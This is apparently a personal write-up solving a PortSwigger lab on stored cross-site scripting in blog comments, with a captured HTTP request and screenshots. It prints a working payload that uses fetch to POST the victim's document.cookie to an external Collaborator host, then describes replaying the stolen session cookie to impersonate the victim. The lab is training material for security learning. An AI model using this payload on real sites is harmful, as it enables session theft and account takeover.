---
tags:
  - xss
  - cookies
  - fetch
---
# Exploiting cross-site scripting to steal cookies

## Instructions

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

!!! warning "Burp Pro is required for this lab"

## Solution

We can confirm there is stored XSS in the comment field of the blog post, as shown below.

```text title="Stored XSS POST request hl_lines="20"
POST /post/comment HTTP/2
Host: 0ac000ed033d3aac92547181004600b4.web-security-academy.net
Cookie: session=epx1wSsiy7ikqoo5ibi87AoLsatokgW4
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Origin: https://0ac000ed033d3aac92547181004600b4.web-security-academy.net
Referer: https://0ac000ed033d3aac92547181004600b4.web-security-academy.net/post?postId=6
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=3t9HKniXOqfQheHTknXahYTSjzQyYXj6&postId=6&comment=test123comment%3Cscript%3Ealert%281%29%3C%2Fscript%3E&name=test123name&email=test123email%40test.com&website=https%3A%2F%2Ftest123site.net
```

![](attachments/xss-lab-22/file-20251124113610719.webp)

We can use the following JS to try to trigger a POST request from any victim who visits this page to our collaborator, containing their cookie in the POST body.

```html
<script>fetch('https://0cda2v39k3dgv46kgz11vmeg177yvojd.oastify.com', { method: 'POST', mode: 'no-cors', body: document.cookie});</script>
```

After posting a comment with that payload in the comment field, we get a POST request to collaborator with the session cookie in the body.

![](attachments/xss-lab-22/file-20251124113610725.webp)

There might be several requests depending on how much you had to tinker with this (a lot for me), but you're looking for the one with the secret cookie in it. 

Send a previous request from burp to repeater and replace the old cookie with this entire string and send the request to solve the lab. 

![](attachments/xss-lab-22/file-20251124113610726.webp)

## Lesson learned

Check for OOB interactions on any stored XSS. **NOTE FOR ME: Learn the Fetch API syntax well**.

